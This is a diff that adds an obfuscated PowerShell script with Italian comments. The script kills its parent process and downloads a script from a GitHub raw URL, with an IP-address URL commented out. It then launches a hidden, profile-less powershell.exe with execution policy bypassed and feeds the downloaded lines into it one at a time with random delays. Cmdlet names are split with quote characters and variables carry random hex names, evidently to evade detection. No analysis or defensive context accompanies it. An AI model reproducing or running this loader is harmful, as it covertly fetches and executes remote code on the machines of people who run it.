@@ -1,0 +1,40 @@
+# 🔥 K''ILL CMD PARENT PROCESS
+$97503ecc658d471eb81645bd1a485549= (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | Sel''e''ct -Expand ParentProcessId) 2>$null
+if ($97503ecc658d471eb81645bd1a485549) { Sto''p-P''ro''c''e''s''s -Id $97503ecc658d471eb81645bd1a485549 -Force -ErrorAction SilentlyContinue }
+
+# $ea8ea90af6dc4018b83708ee6abf64e6 = "http://151.61.206.201/second.txt";
+$ea8ea90af6dc4018b83708ee6abf64e6= "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt";
+$7c372038fe01419986ecefafc91633b5= (New-Object Net.WebClient).DownloadString($ea8ea90af6dc4018b83708ee6abf64e6);
+$cd460ec9a7dc4cb48617ea1e749fc1a9= $7c372038fe01419986ecefafc91633b5 -split "`r?`n";
+
+$6b7897cb45384fcd8bdf60dcf59445aa= New''-Obje''ct System.Diagnostics.ProcessStartInfo;
+$6b7897cb45384fcd8bdf60dcf59445aa.FileName = "powershell.exe";
+$6b7897cb45384fcd8bdf60dcf59445aa.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass";
+$6b7897cb45384fcd8bdf60dcf59445aa.UseShellExecute = $false;
+$6b7897cb45384fcd8bdf60dcf59445aa.RedirectStandardInput = $true;
+$6b7897cb45384fcd8bdf60dcf59445aa.RedirectStandardOutput = $true;
+$6b7897cb45384fcd8bdf60dcf59445aa.RedirectStandardError = $true;
+$6b7897cb45384fcd8bdf60dcf59445aa.CreateNoWindow = $true;
+
+$afdf6cb5a0574346b436be03e27437c7= [System.Diagnostics.Process]::Start($6b7897cb45384fcd8bdf60dcf59445aa);
+St''a''r''t-''Sl''eep -Seconds 1.2;
+
+# 1. INIT error handling
+$afdf6cb5a0574346b436be03e27437c7.StandardInput.WriteLine('$94429f72d7504f7a839b629c17ae0d8f = "SilentlyContinue"');
+$afdf6cb5a0574346b436be03e27437c7.StandardInput.Flush();
+St''a''rt''-''S''l''e''ep -Milliseconds 200;
+
+# 2. INVIO script line-by-line
+foreach ($line in $cd460ec9a7dc4cb48617ea1e749fc1a9) {
+    if ($line.Trim()) {
+        $afdf6cb5a0574346b436be03e27437c7.StandardInput.WriteLine($line.TrimEnd());
+        $afdf6cb5a0574346b436be03e27437c7.StandardInput.Flush();
+        Star''t-S''l''e''ep -Milliseconds (50..150 | Ge''t''-Ran''d''o''m);
+    }
+}
+
+# 🔥 CRITICO: TRIGGER FINALE - ESEGUE tutto!
+$afdf6cb5a0574346b436be03e27437c7.StandardInput.WriteLine('');  # Nuova riga
+$afdf6cb5a0574346b436be03e27437c7.StandardInput.Flush();
+S''ta''rt''-''Sl''e''e''p -Milliseconds 500;
+
